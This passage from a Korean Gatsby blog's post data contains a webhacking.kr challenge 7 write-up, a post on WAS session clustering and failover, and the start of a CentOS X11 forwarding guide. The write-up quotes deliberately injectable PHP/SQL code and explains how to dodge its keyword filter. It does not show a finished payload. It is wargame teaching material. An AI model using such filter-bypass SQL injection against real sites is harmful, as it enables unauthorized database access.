class=\"token variable\">$go</span></span>))))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(((((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)))))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"query error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=\\\"alert('Access_Denied!')\\\">&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=\\\"alert('Hello admin')\\\">&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token delimiter important\">?></span></span>\r\n&lt;a href=./?view_source=1>view-source<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\r\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>~ 첫번째 조건문</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$go</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'val'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$go</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;meta http-equiv=refresh content=0;url=index.php?val=1>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;html>&lt;head>&lt;title>admin page&lt;/title>&lt;/head>&lt;body bgcolor='black'>&lt;font size=2 color=gray>&lt;b>&lt;h3>Admin page&lt;/h3>&lt;/b>&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>val이라는 변수를 $_GET해서 $go라는 변수에 넣고, $go라는 변수가 없으면 val=1로 생성한다.</p>\n<p>그래서 초기 url이 <code class=\"language-text\">https://webhacking.kr/challenge/web-07/index.php?val=1</code>이었던 것으로 보인다.</p>\n<p>두번째 조건문</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/2|-|\\+|from|_|=|\\\\s|\\*|\\//i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$go</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Access Denied!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>preg_match라는 함수는 정규식을 사용하여 문자열을 검색이 가능하다.</p>\n<p>$go 변수에 '2', '-', '+', 'from', '_', '=', ' ', '*', '/' 등이 검색되면 Access Denied라는 문구를 띄운다.</p>\n<p>이 조건문을 우회하려면 변수 val에 어떤 값을 입력할 때 위에서 언급된 것들을 피해야 한다.</p>\n<p>이 조건문을 우회하고 난 이후의 조건문들</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token function\">dbconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token variable\">$rand</span><span class=\"token operator\">=</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=((((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>))))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span><span class=\"token operator\">==</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"select lv from chall7 where lv=(((((<span class=\"token interpolation\"><span class=\"token variable\">$go</span></span>)))))\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nice try!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>dbconnect()를 한 후 위의 다섯 조건문들 중 하나에 랜덤하게 들어간다.</p>\n<p>$go변수, 즉 val에 넣는 값이 그대로 where절에 들어가 쿼리를 실행하게 된다.</p>\n<p>그리고 그 쿼리의 결과를 $result변수에 넣는다.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"query error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=\\\"alert('Access_Denied!')\\\">&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;input type=button style=border:0;bgcolor='gray' value='auth' onclick=\\\"alert('Hello admin')\\\">&lt;p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token function\">solve</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>쿼리 결과가 담긴 $result를 array형태로 만들어 $data에 저장한다.</p>\n<p>data 배열의 맨 첫번째 요소, 즉 lv가 2가 되어야 이 문제를 풀 수 있다.</p>","categories":["writeup","wargame","webhacking"],"date":"February 08, 2020","description":"리뉴얼 기념 정주행","id":"a8ff128d-4d3c-55e1-997d-c492fcc64f1a","keywords":["webhacking.kr"],"slug":"/WriteUp-Webhackingkr-07/","title":"Webhacking.kr 7번","readingTime":{"text":"3 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/034197db4e89663b65a70c958cc5a667/2990b/0.png","srcSet":"/static/034197db4e89663b65a70c958cc5a667/2b65a/0.png 142w,\n/static/034197db4e89663b65a70c958cc5a667/28e88/0.png 284w,\n/static/034197db4e89663b65a70c958cc5a667/2990b/0.png 568w","sizes":"(min-width: 568px) 568px, 100vw"},"sources":[{"srcSet":"/static/034197db4e89663b65a70c958cc5a667/43197/0.webp 142w,\n/static/034197db4e89663b65a70c958cc5a667/66ca8/0.webp 284w,\n/static/034197db4e89663b65a70c958cc5a667/313fd/0.webp 568w","type":"image/webp","sizes":"(min-width: 568px) 568px, 100vw"}]},"width":660,"height":399.71830985915494}}}},"body":"<h1>Clustering</h1>\n<h2>Session &#x26; Cookie &#x26; Clustering</h2>\n<p>http에서 session은 사용자 하나하나를 구분할 수 없고, 상태를 알 수도 없다.</p>\n<p>신원확인을 위해 cookie를 사용한다.</p>\n<p>WAS를 이중화를 해 놓는다면 아래와 같은 모양새가 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"mermaid\"><pre class=\"language-mermaid\"><code class=\"language-mermaid\"><span class=\"token keyword\">graph</span> LR<span class=\"token punctuation\">;</span>\r\n\tA<span class=\"token text string\">[User]</span> <span class=\"token arrow operator\">--></span> B<span class=\"token text string\">[WAS1]</span><span class=\"token punctuation\">;</span>\r\n\tA <span class=\"token arrow operator\">--></span> C<span class=\"token text string\">[WAS2]</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>User는 WAS1에 붙어있다가 문제가 생기면 WAS2에 연결되게 되는데, 로그인 등을 한 상태라면 이 상태를 가지고 그대로 작업을 가능하게 해야 한다.</p>\n<p>이를 위해서 하는 것이 클러스터링이다.</p>\n<p>User가 WAS1에서 쿠키를 받고 작업을 하다가 WAS1과의 연결이 끊어지면 user가 WAS1의 쿠키정보를 그대로 들고 WAS2로 갔을 때 작업이 가능해야 한다.</p>\n<p>하지만 Weblogic의 경우, 위의 그림과 같은 상태일 때 계속해서 새로고침을 하면 Session ID나 쿠키값이 계속 달라지는 것을 볼 수 있다.</p>\n<p>이는 새로고침 할 때마다 서버가 User를 각기 다른 사람으로 인식하기 때문이다.</p>\n<p>이를 위해 Web server를 사이에 설치해 준다.</p>\n<div class=\"gatsby-highlight\" data-language=\"mermaid\"><pre class=\"language-mermaid\"><code class=\"language-mermaid\"><span class=\"token keyword\">graph</span> LR<span class=\"token punctuation\">;</span>\r\nA<span class=\"token text string\">[User]</span> <span class=\"token arrow operator\">==></span> B<span class=\"token text string\">[Web server]</span><span class=\"token punctuation\">;</span>\r\nB <span class=\"token arrow operator\">--></span> C<span class=\"token text string\">[WAS1]</span><span class=\"token punctuation\">;</span>\r\nB <span class=\"token arrow operator\">--></span> D<span class=\"token text string\">[WAS2]</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>User는 새로고침을 하더라도 Web server가 쿠키값을 보고 User를 한 사람으로 인식하고 적절한 WAS로 load balancing 시켜주게 된다.</p>\n<p>또한 WAS들은 계속 같은 Web Server에 연결되어 있기 때문에 새로고침 때문에 User를 다른 사람으로 인식할 일이 없다.</p>\n<h3>JEUS의 경우</h3>\n<p>JEUS6까지 Session server가 따로 존재했었다. 쿠키정보를 Session server에 저장해 두었다.</p>\n<div class=\"gatsby-highlight\" data-language=\"mermaid\"><pre class=\"language-mermaid\"><code class=\"language-mermaid\"><span class=\"token keyword\">graph</span> LR<span class=\"token punctuation\">;</span>\r\nA<span class=\"token text string\">[User]</span> <span class=\"token arrow operator\">==></span> B<span class=\"token text string\">[Web server]</span><span class=\"token punctuation\">;</span>\r\nB <span class=\"token arrow operator\">--></span> C<span class=\"token text string\">[WAS1]</span><span class=\"token punctuation\">;</span>\r\nC <span class=\"token arrow operator\">--></span> D<span class=\"token text string\">[Session server]</span><span class=\"token punctuation\">;</span>\r\nB <span class=\"token arrow operator\">--></span> E<span class=\"token text string\">[WAS2]</span><span class=\"token punctuation\">;</span>\r\nE <span class=\"token arrow operator\">--></span> D<span class=\"token punctuation\">;</span></code></pre></div>\n<p>user와 session연결이 되었을 때마다 session server의 쿠키값을 확인하는 방식이었다.</p>\n<p>JEUS7에 와서는 Session server가 사라졌다. 분산처리하는 방식으로 바뀌었기 때문이다.</p>\n<p>각 WAS에 session server를 두고 공유하는 방식으로 바뀌었다.</p>\n<p>(모두 공유하지 않는다. MS 4개가 있으면, primary server는 하나의 서버만 backup server로 삼는다. 모두 공유하면 리소스 낭비이므로)</p>\n<div class=\"gatsby-highlight\" data-language=\"mermaid\"><pre class=\"language-mermaid\"><code class=\"language-mermaid\"><span class=\"token keyword\">graph</span> LR<span class=\"token punctuation\">;</span>\r\nA<span class=\"token text string\">[User]</span> <span class=\"token arrow operator\">==></span> B<span class=\"token text string\">[Web server]</span> <span class=\"token arrow operator\">--></span> C<span class=\"token text string\">[WAS1 :Session Server]</span><span class=\"token punctuation\">;</span>\r\nB <span class=\"token arrow operator\">--></span> D<span class=\"token text string\">[WAS2 :Session Server]</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3>Primary / Secondary(==backup)</h3>\n<p>보통 User와 최초 연결되는 서버가 Primary, 나머지 이중화 서버가 Secondary가 된다.</p>\n<p>Client가 primary 서버과 failover 되었을 때</p>\n<p>WebLogic의 경우: secondary를 바로 primary로 삼고 작업을 진행</p>\n<p>JEUS의 경우: 가장 가까운, 가령 third server에 가서 primary에게 다시한번 연결요청을 한다. 그래도 연결요청이 실패하면 secondary와 연결한다</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 568px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.0909090909091%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAChElEQVR42mVSaXOiQBDl//+PZI0aBAG5QRM88kWTVA6XXVETI+tyn2FgsLfQ1O6H7Xo1NdXv9XTX6yEA4HiECtcVrjE+Vg3q+ghpli/uHxaLh83brv5PcDwCABDpJ3Yj5MfIDQs/Rl6M3KgIkurg5y/ft0/LtfXuBEnpRU2+EURfSPKKcELUPNQEnKb4irquAf5l/jIAUB9rjGs/Lgk/LqsS3c3uNE3TVHU6mYzH4/l8vlmvi6IAAHu/Hw6HuqYbhjE2jNvb2/l87rlOnGEizKrPPJtOJhLPC9xAVxRNUTRZeXl+RggBwP7jQ5UkieclQdBVVZWkoaYd7J0blUSU4SxNZEHgGUbmeYFlRI5jSJKhqM1mczgcxuMx2W43xYOBwLICy5Kdztb6GWY1EaZVnqWaqvIsy7Ncv9cTBwOB4zrttu/7AGAYRq/blQWB6zMMTYs8z/b7b9t1kGAiTEsAwCd7sjS11uuzSXme73a77XZr2/Z5M47jvO92jRhjAHBD1HTGVWma5nK5fLi/n04m1sqyLOuXbZum+fj4aO/3y9dX0/yxWMxns5llNXySRI3bQVIVRT4xDI5hrlqtbxcXkiCOhkNFls9jz6ZTiuwNWK51edlutWRJuhmNfh9sLy6JJMdpmuiqqgiCLssix2mSxLOMwHGr1crzvJvRiL6+HiqqIojSgFclkaWot40VpJhwwjLPEpHn+yTJ0X2Goliaprrdka7HcQwAz09P3asrju5zNN2wFEV2OhtrFWU14cUIjjgK/cBzGvhu6DeXPI3PnwwVRei7fkOd4Dlh4KIij9KKcEPkhMhPsBtj7wQ3ak4nqmyvOPjoECA3xmfBWePG2AlREKM/+qPY2wXpOv4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/034197db4e89663b65a70c958cc5a667/c9b55/0.webp 165w,\n/static/034197db4e89663b65a70c958cc5a667/f2908/0.webp 330w,\n/static/034197db4e89663b65a70c958cc5a667/bebff/0.webp 568w\"\n              sizes=\"(max-width: 568px) 100vw, 568px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/034197db4e89663b65a70c958cc5a667/04c57/0.png 165w,\n/static/034197db4e89663b65a70c958cc5a667/d9ecf/0.png 330w,\n/static/034197db4e89663b65a70c958cc5a667/10e91/0.png 568w\"\n            sizes=\"(max-width: 568px) 100vw, 568px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/034197db4e89663b65a70c958cc5a667/10e91/0.png\"\n            alt=\"session server 관계\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<h3>Failover</h3>\n<p>MS1에서 문제가 발생했을 때, MS2로 역할을 넘기면서 장애를 <strong>극복</strong></p>\n<h3>Failback</h3>\n<p>장애상황 이후, MS1이 MS2로부터 <strong>역할을 회복</strong></p>\n<h2>Rolling Restart</h2>\n<p>클러스터링 된 4개의 MS A, B, C, D</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 568px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.0909090909091%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACiUlEQVR42mVQaW/aQBT0//8diDSBgE/WJ4bEdmhSiUQkaUw4TGqg1PcZ1l57K0P6qavZ1Xua2fdGQ2CM6xqXqCpRhVBdNqiqGqdZPn18mk6frA+7+k9Q1xhjTKSfyI2gH0M3Ovox9JoCBklx8LNXc/P8tl79coKk8KJ/gugLSV4STgibQc2o+uSibm5d1XWFT+fEfVH1uakrhCo/LggvLsoCfp9MhspQURTjzjDujPuHe/PNhBBijHfb7UhVVXWk3d5qmq5p2mQycZw/cYaIMCs/82xiGCIAPMepsqzKsiJJL7NZURQY4+12q4iiCIAIeFVRFFEcyvLvne1GBRFlKEsTiecBw0gAAIYROI7p9xiKsizrcDjout67umo+DwY8y/Is2+90NqtFmFVEmJZ5lg5lBTAs4Fi63+cHA8Bxnasr3/cxxpqm9btdiec5mmZIUgCApeiPzTpIEBGmjbeqauJJs2y9Xp+zyfPctu3NZrPf709xYsd1bdvGGKMSYYzdEDabUVmYpmm+mY/TqaFrq9V6tVzud/v5fD6bzXa73c/X18X74sfDg6HrlrWZz9+jMPCTkgiS8njMdU3jaOby4qLdaomCcDMey5J8tn1nGP3ra34waLda39ptWZJG6uiw33pxSSQ5StOkiZHnVUkSOG4oCoBheI5bLpee592Mx1SvN5JlhRdEABRBYEnyw1oFKSKcsMizRACA7vU4imb6JEtRZLc7VtU4jjHGL8/P3ctLjqZZimJIkiWpXqdjrRZRVhFeDHGNotAPPKeB74Z+U+RpfE4RHo+h7/oNdYLnhIELj3mUloQbQieEfoLcGHknuFHzOlG5944HHx4C6MboLDhr3Bg5IQxi+BcmqNhnTIdkWwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/96e92ce046d4e70c6873d9ea455b51b3/c9b55/1.webp 165w,\n/static/96e92ce046d4e70c6873d9ea455b51b3/f2908/1.webp 330w,\n/static/96e92ce046d4e70c6873d9ea455b51b3/bebff/1.webp 568w\"\n              sizes=\"(max-width: 568px) 100vw, 568px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/96e92ce046d4e70c6873d9ea455b51b3/04c57/1.png 165w,\n/static/96e92ce046d4e70c6873d9ea455b51b3/d9ecf/1.png 330w,\n/static/96e92ce046d4e70c6873d9ea455b51b3/10e91/1.png 568w\"\n            sizes=\"(max-width: 568px) 100vw, 568px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/96e92ce046d4e70c6873d9ea455b51b3/10e91/1.png\"\n            alt=\"session server 관계2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>유저가 A에 연결되어 있는 상태. Primary server A, Secondary(backup) server C</p>\n<p>ABCD 차례차례 재기동시키면, 세션이 유지가 될까?</p>\n<ul>\n<li>원래는 세션이 유지되지 않는다</li>\n<li>JEUS의 경우, 세션에 연결되어 있는 사용자가 재기동 하는 중에 \"타이밍 좋게 세션을 다시 신청하지 않았다\"면, 세션은 끊어진다.\n<ul>\n<li>세션을 새로 만드는 트리거는 사용자이지(새로고침 등), 운영자가 단순 재기동하는 행위는 세션을 다시 만들지 않기 때문이다.</li>\n</ul>\n</li>\n<li>세션 유지가 되게끔 만든 JEUS의 기능: Failback\n<ul>\n<li>세션이 있던 A를 죽임 -> B로 failover -> B가 계속 A를 주시 -> A가 살아나면 B가 본인이 가지고 있는 모든 정보(세션, 쿠키정보 등)을 A로 밀어넣는다.</li>\n</ul>\n</li>\n</ul>\n<h2>Config</h2>\n<p>Jeus -> Servers -> [서버 선택] -> Engine -> Session Config\r\nShared에 체크\r\n고급 선택사항 -> Tracking Mode: Cookie에 체크\r\nSession Cookie -> Domain 설정하기</p>","categories":["misc","setting"],"date":"February 07, 2020","description":null,"id":"25af225a-b88e-511d-b085-067dd7a67fb6","keywords":["was","webserver","weblogic","jeus","middleware"],"slug":"/WAS-Clustering/","title":"WAS Clustering","readingTime":{"text":"6 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/08aa88c995dd3c7fe84c1e1576341442/1c7e3/0.png","srcSet":"/static/08aa88c995dd3c7fe84c1e1576341442/448cf/0.png 128w,\n/static/08aa88c995dd3c7fe84c1e1576341442/c0c4f/0.png 255w,\n/static/08aa88c995dd3c7fe84c1e1576341442/1c7e3/0.png 510w","sizes":"(min-width: 510px) 510px, 100vw"},"sources":[{"srcSet":"/static/08aa88c995dd3c7fe84c1e1576341442/75874/0.webp 128w,\n/static/08aa88c995dd3c7fe84c1e1576341442/1f00a/0.webp 255w,\n/static/08aa88c995dd3c7fe84c1e1576341442/a2a5c/0.webp 510w","type":"image/webp","sizes":"(min-width: 510px) 510px, 100vw"}]},"width":660,"height":399.88235294117646}}}},"body":"<h1>1. CentOS yum install xorg</h1>\n<p>CentOS에서 설치해야 할 패키지는 세가지이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">yum <span class=\"token function\">install</span> xorg-x11-apps.x86_64\r\nyum <span class=\"token function\">install</span> xorg-x11-xauth.x86_64\r\nyum <span class=\"token function\">install</span> xorg-x11-server-Xorg.x86_64</code></pre></div>\n<h1>2. X11Forwarding yes</h1>\n<p>그리고 <code class=\"language-text\">/etc/ssh/sshd_config</code>에서</p>\n<p><code class=\"language-text\">X11Forwarding yes</code> 설정을 해준다.</p>\n<h1>3. Xming 